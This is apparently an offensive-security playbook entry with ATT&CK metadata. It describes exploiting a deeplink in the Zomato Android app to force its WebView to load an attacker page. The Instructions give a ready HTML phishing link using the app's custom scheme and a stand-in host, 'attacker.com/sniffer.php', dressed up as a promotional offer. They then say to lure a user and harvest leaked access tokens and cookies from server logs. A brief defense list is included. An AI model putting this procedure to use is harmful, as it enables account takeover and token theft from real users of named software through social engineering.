---
tags:
  - android
  - exploitation
  - token-leak
  - xss
type: procedure
tools: []
tactics:
  - '[[Collection]]'
commands: []
verified: false
platforms:
  - Android
submitted: true
techniques:
  - '[[JavaScript]]'
  - '[[Credentials In Files]]'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
id: 569eb64a-6d0c-48b8-bd54-e7dd8283800e
created_at: '2025-12-14T17:25:18.217Z'
updated_at: '2025-12-14T17:25:18.217Z'
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[JavaScript]]'
  - '[[Credentials In Files]]'
---
# Trigger-Intent-to-Load-Malicious-URL-in-WebView

## Summary

This procedure triggers the crafted malicious intent through user interaction, loading the URL in the app's WebView to exfiltrate sensitive data like access tokens.

## Description

Delivery via HTML link or another app tricks the user into opening the deeplink, causing WebView to load the malicious site which captures cookies/headers. Enables token leakage and XSS. Requires social engineering. Outcome: Data exfiltration to attacker.

## Requirements

1. Crafted intent from prior step
2. Delivery vector (e.g., email, website)
3. Monitoring server for captured data

## Defense

Defensive measures and detection strategies:

- Educate users on suspicious links
- Disable auto-handling of custom schemes
- Network monitoring for anomalous requests from app

## Objectives

1. Initiate WebView load of malicious URL
2. Capture leaked sensitive information
3. Execute XSS if applicable

## Instructions

### Step 1: Deliver Malicious Link

**Context**: Embed deeplink in accessible format.

Create HTML:

```html
<a href="zomatodelivery://zloyaltywebview/?url=https://attacker.com/sniffer.php&navigation_bar_type=transparent">Open Zomato Offer</a>
```

Host and lure user to click on device with app.

> User clicks trigger intent. Expected output: WebView loads, server receives request with tokens.

### Step 2: Monitor Exfiltration

**Context**: Verify data capture.

Check server logs for headers/cookies containing Zomato auth data.

> Expected output: Logs showing leaked access tokens.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]]

### Techniques

- [[JavaScript]]
- [[Credentials In Files]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[android]]
- [[exploitation]]
